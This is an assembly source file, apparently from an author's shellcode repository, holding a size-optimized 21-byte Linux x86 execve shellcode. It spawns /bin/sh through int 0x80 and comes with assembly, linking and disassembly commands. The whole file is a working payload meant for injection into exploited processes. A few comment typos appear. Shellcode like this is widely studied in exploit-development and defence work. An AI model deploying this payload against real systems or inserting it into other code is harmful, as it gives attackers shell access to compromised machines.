; lnx-execve-cdq-xchg-x86_32.s
; 21-bytes Linux EXECVE(2) shellcode for x86 instruction set. Optimized with
; CDQ/XCHG instructions.
;
; Used the 'cgq' and 'xchg' instructions (1 byte opcodes) in place of
; repectively the 'xor' and 'mov' instructions to shorten the shellcode.
; Intentionally left the ECX register untouched, which is initially a pointer
; to a character array (function's argument vector). The 'xchg' instructions
; are chained so EAX becomes zero before the system call's number is copied to
; the least-significant 8 bits.
;
; Written by e3prom (github.com/e3prom)
;
; nasm -f elf32 lnx-execve-cdq-xchg-x86_32.s
; ld -m elf_i386 lnx-execve-cdq-xchg-x86_32.o -o lnx-execve-cdq-xchg-x86_32
; objdump -d lnx-execve-cdq-xchg-x86_32
BITS 32

section .text
  global _start

  _start:
    ; EXECVE(2) - execute program
    ;             int execve(const char *filename, char *const argv[], char *const envp[]);
    cdq					; Set EDX to zero.
    push edx				; Push EDX onto the stack.
    push 0x68732f2f			; Push first 4 bytes of the filename string onto the stack.
    push 0x6e69622f			; Push the remaining 4 bytes onto the stack (python: '/bin//sh'[::-1].encode('hex')).
    mov ebx, esp			; Copy stack pointer to EBX (argv1) so it points to the filename.
    push edx				; Push a null register onto the stack.
    xchg eax, esp 			; Swap the stack pointer ESP for EAX.
    xchg edx, eax			; Swap EDX (argv3) for EAX, so the latter is now zero.
    mov al, 0x0b			; Move '0x0b' to AL/EAX (execve syscall number 11).
    int 0x80				; Peform sysstem call through interrupt vector 0x80.
